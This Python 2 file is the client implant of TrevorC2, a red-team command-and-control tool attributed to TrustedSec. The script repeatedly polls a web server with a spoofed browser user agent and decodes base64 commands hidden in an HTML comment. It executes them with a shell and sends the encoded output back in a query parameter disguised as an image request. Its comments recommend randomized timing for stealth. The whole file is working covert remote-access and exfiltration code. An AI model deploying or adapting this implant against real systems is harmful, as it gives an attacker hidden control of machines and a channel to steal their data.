#!/usr/bin/env python
#
# TrevorC2 - legitimate looking command and control 
# Written by: Dave Kennedy @HackingDave
# Website: https://www.trustedsec.com
# GIT: https://github.com/trustedsec
#
# This is the client connection, and only an example. Refer to the readme 
# to build your own client connection to the server C2 infrastructure.

# site used to communicate with (remote TrevorC2 site)
site_url = ("http://127.0.0.1")

# THIS IS WHAT PATH WE WANT TO HIT FOR CODE
root_path_query = ("/")

# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
site_path_query = ("/images")

# THIS IS THE QUERY STRING PARAMETER USED
query_string = ("guid=")

# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
stub = ("oldcss=")

# time_interval is the time used between randomly connecting back to server, for more stealth, increase this time a lot and randomize time periods
time_interval1 = 3
time_interval2 = 8

import urllib2
import random
import base64
import time
import subprocess

# random interval for communication
def random_interval(time_interval1, time_interval2):
    return random.randint(time_interval1, time_interval2)

# main call back here
while 1:
    time.sleep(random_interval(time_interval1, time_interval2))
    try:
        # request with specific user agent
        req = urllib2.Request(site_url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
        html = urllib2.urlopen(req).read()
        # <!-- PARAM=bm90aGluZw== --></body> -  What we split on here on encoded site
        parse = html.split("<!-- %s" % (stub))[1].split("-->")[0]
        parse = base64.b64decode(parse)
        if parse == "nothing": pass
        else:
            # execute our parsed command
            proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout_value = proc.communicate()[0]
            stdout_value = base64.b64encode(stdout_value)
            # pipe out stdout and base64 encode it then request via a query string parameter
            req = urllib2.Request(site_url + site_path_query + "?" + query_string + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
            html = urllib2.urlopen(req).read()
            # sleep random interval and let cleanup on server side
            time.sleep(random_interval(time_interval1, time_interval2))

    # handle exceptions and pass if the server is unavailable, but keep going
    except urllib2.URLError: pass
